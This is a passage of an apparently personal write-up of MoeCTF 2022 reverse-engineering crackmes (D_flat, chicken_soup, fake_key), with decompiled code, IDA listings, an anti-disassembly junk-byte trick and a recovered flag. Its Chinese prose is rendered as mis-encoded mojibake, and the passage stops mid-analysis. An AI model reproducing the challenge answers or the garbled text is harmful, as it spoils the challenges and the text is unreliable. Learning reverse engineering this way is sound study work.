<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ModelRef</span>(<span class="title class_ inherited__">Z3PPObject</span>):</span><br><span class="line">	...</span><br><span class="line">	   <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> obj_to_string(<span class="variable language_">self</span>)</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ªobj_to_stringå‡½æ•°,è¿™ä¸ªå‡½æ•°ä¹Ÿæ˜¯z3æ¨¡å—æä¾›çš„</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">obj_to_string</span>(<span class="params">a</span>):</span><br><span class="line">    out = io.StringIO()<span class="comment">#éƒ½æ˜¯pythonè‡ªå¸¦ç±»å‹,åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²æµå¯¹è±¡</span></span><br><span class="line">    _PP(out, _Formatter(a))<span class="comment">#z3æ¨¡å—å‡½æ•°,å°†z3æ¨¡å—å¯¹è±¡aæŒ‰ç…§å…¶å®é™…ç±»å‹è½¬æ¢åæ”¾åˆ°outæµä¸Š</span></span><br><span class="line">    <span class="keyword">return</span> out.getvalue()<span class="comment">#getvalueå–å¾—å­—ç¬¦ä¸²æµä¸Šçš„å­—ç¬¦ä¸²,è¿”å›</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œz3æ¨¡å—å‡½æ•°Formatterä¼šæ ¹æ®z3å¯¹è±¡açš„å®é™…ç±»å‹,å†³å®šè¿”å›ä»€ä¹ˆæ ·çš„å­—ç¬¦ä¸²</p>
<h3 id="d_flat">D_flat</h3>
<p>ç»™äº†å¥½å¤šä¸ªæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         2022/7/19     18:10            410 D_flat.deps.json</span><br><span class="line">-a----         2022/7/19     18:11           5632 D_flat.dll</span><br><span class="line">-a----         2022/7/19     18:11         149504 D_flat.exe</span><br><span class="line">-a----         2022/7/19     18:11          10384 D_flat.pdb</span><br><span class="line">-a----         2022/7/19     18:10            253 D_flat.runtimeconfig.json</span><br></pre></td></tr></table></figure>
<p>æˆ‘è®¤è¯†çš„æœ‰</p>
<p>dll,åŠ¨æ€é“¾æ¥åº“</p>
<p>exe,ä¸»ç¨‹åº,å…¥å£ç‚¹</p>
<p>pdb,ç¬¦å·æ–‡ä»¶,idaè°ƒè¯•æ—¶å¯ä»¥è½½å…¥</p>
<p>æˆ‘è®¤è¯†jsonæ˜¯å­—ç¬¦ä¸²å­˜å‚¨çš„jså¯¹è±¡,ä½†æ˜¯ä¸çŸ¥é“è¿™é‡Œä¸¤ä¸ªjsonæ–‡ä»¶å¯ä»¥å¹²å•¥</p>
<p>ç”¨exeinfopeæŸ¥dllæ–‡ä»¶çš„å£³å‘ç°æ˜¯C#ç¼–å†™çš„,</p>
<p>ç”¨ida64æ‰“å¼€D_flat.exeä¹‹åå°±å‚»çœ¼äº†,çœ‹ä¸åˆ°ä¸€ç‚¹flagçš„ç—•è¿¹,æ„Ÿè§‰éƒ½æ˜¯ä»€ä¹ˆ.NETå¹³å°è¿˜æœ‰C#é‚£ä¸€å¥—ä¸œè¥¿çš„ç¯å¢ƒåˆå§‹åŒ–</p>
<p>å¸ˆå‚…è¯´ç”¨dnspyåæ±‡ç¼–D_flat.dll,åˆšç”¨dnspyè’™è”½çš„å¾ˆ,ä½†æ˜¯è½¬åˆ°å…¥å£ç‚¹äº”ä¸ªå­—æˆ‘è¿˜æ˜¯è®¤å¾—çš„</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110180846574.png"
alt="image-20221110180846574" />
<figcaption aria-hidden="true">image-20221110180846574</figcaption>
</figure>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x02000002 RID: 2</span></span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">D_flate</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">int</span> f = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">int</span>[] flag = <span class="keyword">new</span> <span class="built_in">int</span>[]</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="number">109</span>,</span><br><span class="line">			<span class="number">111</span>,</span><br><span class="line">			...</span><br><span class="line">			<span class="number">33</span>,</span><br><span class="line">			<span class="number">125</span></span><br><span class="line">		&#125;;</span><br><span class="line">		Console.WriteLine(<span class="string">&quot;In music theory, there is a note that has the same pitch as D flat.&quot;</span>);</span><br><span class="line">		Console.WriteLine(<span class="string">&quot;Do you know it?\nNow plz input your flag:&quot;</span>);</span><br><span class="line">		<span class="built_in">string</span> input = Console.ReadLine();</span><br><span class="line">		<span class="built_in">byte</span>[] byteArray = Encoding.ASCII.GetBytes(input);</span><br><span class="line">		<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; input.Length; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (flag[i] == (<span class="built_in">int</span>)byteArray[i])</span><br><span class="line">			&#123;</span><br><span class="line">				f++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (f == flag.Length)</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine(<span class="string">&quot;TTTTTQQQQQQLLLLLLL!!! This is your flag!&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		Console.WriteLine(<span class="string">&quot;QwQ, plz try again.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ€ä¹ˆC#ç¨‹åºé•¿å¾—è·Ÿjavaè¿™ä¹ˆåƒ?ç±»é‡Œé¢æ‰èƒ½æœ‰mainå‡½æ•°æ˜¯å§?</p>
<p>å®é™…ä¸Šé€»è¾‘å¾ˆç®€å•,å°±æ˜¯è¾“å…¥ä¸€ä¸²å’Œè¿™ä¸ªflagæ•°ç»„æ¯”ä¸€ä¸‹,å¦‚æœä¸€æ¨¡ä¸€æ ·åˆ™æˆåŠŸ</p>
<p>è§£æ³•ä¹Ÿå¾ˆç®€å•</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">vector&lt;<span class="type">char</span>&gt; flag = &#123;<span class="number">109</span>, <span class="number">111</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">123</span>, <span class="number">68</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">33</span>, <span class="number">125</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> c : flag)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\moectfwp\MoeCTF_2022-main\Challenges\Reverse\D_flat\D_flat&gt; g++ main.cpp -o main</span><br><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\moectfwp\MoeCTF_2022-main\Challenges\Reverse\D_flat\D_flat&gt; ./main</span><br><span class="line">moectf&#123;D_flate_is_C_sharp!&#125;</span><br></pre></td></tr></table></figure>
<p>è§£æ˜¯è§£å‡ºæ¥äº†,ä½†æ˜¯è¿˜æœ‰å‡ ä¸ªé—®é¢˜,</p>
<p>1.exeæ–‡ä»¶æ˜¯å¹²å•¥çš„?ä¸»è¦é€»è¾‘éƒ½æ”¾åœ¨dllä¸­äº†,è¦exeæœ‰ä½•ç”¨?</p>
<p>2.æˆ‘æ€ä¹ˆä¸Šæ¥å°±çŸ¥é“åº”è¯¥å»dllä¸­æ‰¾èŒ¬?</p>
<p>3.exeä¸­å¹²äº†å•¥</p>
<h3 id="chicken_soup">chicken_soup</h3>
<p>èŠ±æŒ‡ä»¤,å½“æ—¶åªçŸ¥é“è¿™æ˜¯èŠ±æŒ‡ä»¤,ä¸çŸ¥é“æ€ä¹ˆå¤„ç†èŠ±æŒ‡ä»¤,å¹¸å¥½é€»è¾‘æ¸…æ™°,çœ‹æ±‡ç¼–ä¹Ÿèƒ½åˆ†æ</p>
<p>å®é™…ä¸ŠæŠŠèŠ±æŒ‡ä»¤éƒ½æ”¹æˆnopæŒ‡ä»¤å°±å¯ä»¥è®©idaæ­£ç¡®åç¼–è¯‘</p>
<p>ç›´æ¥ç”¨idaæ‰“å¼€ç¨‹åºåç¼–è¯‘mainå‡½æ•°,è¾“å…¥inputè¦æ±‚æ˜¯38ä¸ªå­—ç¬¦,ç»è¿‡ä¸¤ä¸ªåŠ å¯†å‡½æ•°,encrypt1,encrypt2ä¹‹å,ä¸å¯†æ–‡targetæ¯”è¾ƒ,å¦‚æœä¸€æ¨¡ä¸€æ ·å°±é€šè¿‡</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">100</span>]; <span class="comment">// [esp+10h] [ebp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I poisoned the program... Can you reverse it?!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Come on! Give me your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)input);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) == <span class="number">38</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (__cdecl *)(<span class="type">char</span> *))encrypt1)(input);</span><br><span class="line">    ((<span class="type">void</span> (__cdecl *)(<span class="type">char</span> *))encrypt2)(input);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, &amp;target) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nTTTTTTTTTTQQQQQQQQQQQQQLLLLLLLLL!!!!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nQwQ, please try again.&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nQwQ, please try again.&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>targetä¸€ç›´,é‚£ä¹ˆé—®é¢˜è½¬åŒ–ä¸ºæ±‚ä¸¤ä¸ªåŠ å¯†å‡½æ•°çš„é€†</p>
<p>ç„¶è€Œè¿™ä¸ªencrypt1å¹¶æ²¡æœ‰è¢«idaè¯†åˆ«ä¸ºå‡½æ•°,ä»–é•¿å¾—ç‰¹åˆ«ä¸‘</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 encrypt1:                               ; CODE XREF: _main+85â†“p</span><br><span class="line">.text:00401000                 push    ebp</span><br><span class="line">.text:00401001                 mov     ebp, esp</span><br><span class="line">.text:00401003                 sub     esp, 14h</span><br><span class="line">.text:00401006                 push    ebx</span><br><span class="line">.text:00401007                 push    esi</span><br><span class="line">.text:00401008                 push    edi</span><br><span class="line">.text:00401009                 jz      short near ptr loc_40100D+1</span><br><span class="line">.text:0040100B                 jnz     short near ptr loc_40100D+1</span><br><span class="line">.text:0040100D</span><br><span class="line">.text:0040100D loc_40100D:                             ; CODE XREF: .text:00401009â†‘j</span><br><span class="line">.text:0040100D                                         ; .text:0040100Bâ†‘j</span><br><span class="line">.text:0040100D                 jmp     near ptr 13855D9h</span><br><span class="line">.text:0040100D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401012                 align 4</span><br><span class="line">.text:00401014                 dd 8B09EB00h, 0C083F845h, 0F8458901h, 89084D8Bh, 558BF44Dh</span><br><span class="line">.text:00401014                 dd 1C283F4h, 8BF05589h, 88AF445h, 83FF4D88h, 8001F445h</span><br><span class="line">.text:00401014                 dd 7500FF7Dh, 0F4558BEEh, 89F0552Bh, 458BEC55h, 1E883ECh</span><br><span class="line">.text:00401014                 dd 73F84539h, 84D8B1Fh, 0FF84D03h, 8B0151B6h, 45030845h</span><br><span class="line">.text:00401014                 dd 8B60FF8h, 558BCA03h, 0F8550308h, 0A3EB0A88h, 8B5B5E5Fh</span><br><span class="line">.text:00401014                 dd 0CCC35DE5h, 0CCCCCCCCh</span><br><span class="line">.text:00401080 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>00401009
å’Œ0040100Bè¿™ä¸¤ä¸ªåœ°æ–¹çš„æŒ‡ä»¤å¾ˆå¥‡æ€ª,è·³è½¬åˆ°åŒä¸€ä¸ªåœ°æ–¹,loc_40100D+1,ä¹Ÿå°±æ˜¯è¯´è¶Šè¿‡äº†loc_40100Dè¿™ä¸ªåœ°æ–¹çš„"èŠ±æŒ‡ä»¤"</p>
<p>æ€ä¹ˆè®©idaçœ‹èµ·æ¥æ­£å¸¸ç‚¹?å¯ä»¥åœ¨00401009ä¸‹æ–­ç‚¹ç„¶ååŠ¨æ€è°ƒè¯•è¿‡å»,æ­¤æ—¶.text:0026100D
db 0E9hè¿™æ¡èŠ±æŒ‡ä»¤å°±éå¸¸æ˜æ˜¾äº†,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00261000 encrypt1:                               ; CODE XREF: _main+85â†“p</span><br><span class="line">.text:00261000 push    ebp</span><br><span class="line">.text:00261001 mov     ebp, esp</span><br><span class="line">.text:00261003 sub     esp, 14h</span><br><span class="line">.text:00261006 push    ebx</span><br><span class="line">.text:00261007 push    esi</span><br><span class="line">.text:00261008 push    edi</span><br><span class="line">.text:00261009 jz      short loc_26100E</span><br><span class="line">.text:0026100B jnz     short loc_26100E</span><br><span class="line">.text:0026100B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0026100D db 0E9h</span><br><span class="line">.text:0026100E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0026100E</span><br><span class="line">.text:0026100E loc_26100E:                             ; CODE XREF: .text:00261009â†‘j</span><br><span class="line">.text:0026100E                                         ; .text:0026100Bâ†‘j</span><br><span class="line">.text:0026100E mov     dword ptr [ebp-8], 0</span><br><span class="line">.text:00261015 jmp     short loc_261020</span><br><span class="line">.text:00261017 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00261017</span><br><span class="line">.text:00261017 loc_261017:                             ; CODE XREF: .text:00261072â†“j</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>æŠŠå®ƒæ”¹æˆnopç©ºæ“ä½œæŒ‡ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00261000 encrypt1:                               ; CODE XREF: _main+85â†“p</span><br><span class="line">.text:00261000 push    ebp</span><br><span class="line">.text:00261001 mov     ebp, esp</span><br><span class="line">.text:00261003 sub     esp, 14h</span><br><span class="line">.text:00261006 push    ebx</span><br><span class="line">.text:00261007 push    esi</span><br><span class="line">.text:00261008 push    edi</span><br><span class="line">.text:00261009 jz      short loc_26100E</span><br><span class="line">.text:0026100B jnz     short loc_26100E</span><br><span class="line">.text:0026100D nop</span><br><span class="line">.text:0026100E</span><br><span class="line">.text:0026100E loc_26100E:                             ; CODE XREF: .text:00261009â†‘j</span><br><span class="line">.text:0026100E                                         ; .text:0026100Bâ†‘j</span><br><span class="line">.text:0026100E mov     dword ptr [ebp-8], 0</span><br><span class="line">.text:00261015 jmp     short loc_261020</span><br></pre></td></tr></table></figure>
<p>ç„¶ååœ¨encrypt1ä¸ŠæŒ‰pé”®è½¬åŒ–ä¸ºå‡½æ•°,å°±å¯ä»¥ç”¨F5åç¼–è¯‘äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">encrypt1</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(a1) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a1[i] += a1[i + <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸€ç›®äº†ç„¶,èµå¿ƒæ‚¦ç›®</p>
<p>å‡ºé¢˜äººæ€ä¹ˆå‡ºçš„é¢˜?ç”¨VC++å†…è”æ±‡ç¼–å†™çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">enc1</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* input)</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        jz label</span><br><span class="line">        jnz label</span><br><span class="line">        _emit <span class="number">0xe9</span></span><br><span class="line">        label:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)input) - <span class="number">1</span>; i++)</span><br><span class="line">        input[i] += input[i + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>emit
æŒ‡ä»¤ç›´æ¥åœ¨ä»£ç æ®µæ’å…¥æ•°æ®,åæ±‡ç¼–å™¨ä¼šç›´æ¥æŠŠæ’å…¥çš„æ•°æ®ä¹Ÿå½“æˆä»£ç ,å°è¯•åæ±‡ç¼–,å‘ç°æ²¡æœ‰å¯¹åº”ä»»ä½•æŒ‡ä»¤,å¯„äº†.è¿™å°±æ˜¯èŠ±æŒ‡ä»¤</p>
<p>å‰é¢ä¸¤ä¸ªjz,jnzä¿è¯è·³è¿‡emitå®šä¹‰çš„æ•°æ®,å°†æ§åˆ¶è½¬ç§»åˆ°label,é¡ºåŠ¿æ‰§è¡Œä¸‹é¢çš„forå¾ªç¯äº†</p>
<h3 id="fake_key">fake_key</h3>
<h4 id="åˆ†æfake_key.exe">åˆ†æfake_key.exe</h4>
<p>å½“æ—¶é€šäº†,ä½†æ˜¯æœ‰ä¸€ä¸ªç–‘é—®æ˜¯,keyæ˜¯å•¥æ—¶å€™è¢«ä¿®æ”¹çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input[<span class="number">112</span>]; <span class="comment">// [rsp+20h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">int</span> lenInput; <span class="comment">// [rsp+90h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> lenStr; <span class="comment">// [rsp+94h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+9Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_401800(argc, argv, envp);</span><br><span class="line">  lenStr = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I changed the key secretly, you can&#x27;t find the right key!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;And I use random numbers to rot my input, you can never guess them!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Unless you debug to get the key and random numbers...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now give me your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  lenInput = <span class="built_in">strlen</span>(input);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; lenInput; ++i )</span><br><span class="line">    input[i] ^= key[i % lenStr];</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; lenInput; ++j )</span><br><span class="line">    input[j] += rand() % <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strcmp</span>(input, &amp;target) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nRight! TTTTTQQQQQLLLLL!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;QwQ, plz try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œkeyä¸€å¼€å§‹æ˜¯"yunzh1jun"å­—æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000403040 key             db &#x27;yunzh1jun&#x27;,0        ; DATA XREF: sub_401550+5â†‘o</span><br><span class="line">.data:0000000000403040                                         ; sub_401550+2Aâ†‘o ...</span><br></pre></td></tr></table></figure>
<p>é¢˜ç›®ä¸­æç¤º"I changed the key
secretly",å·ç€æŠŠkeyæ”¹äº†,å½“æ—¶åœ¨keyä¸Šçœ‹çš„äº¤å‰å¼•ç”¨å‘ç°ç¡®å®æœ‰ä¸ªå‡½æ•°ä¼šä¿®æ”¹key</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110191538085.png"
alt="image-20221110191538085" />
<figcaption aria-hidden="true">image-20221110191538085</figcaption>
</figure>
<p>å»sub_401550å‡½æ•°çœ‹çœ‹</p>
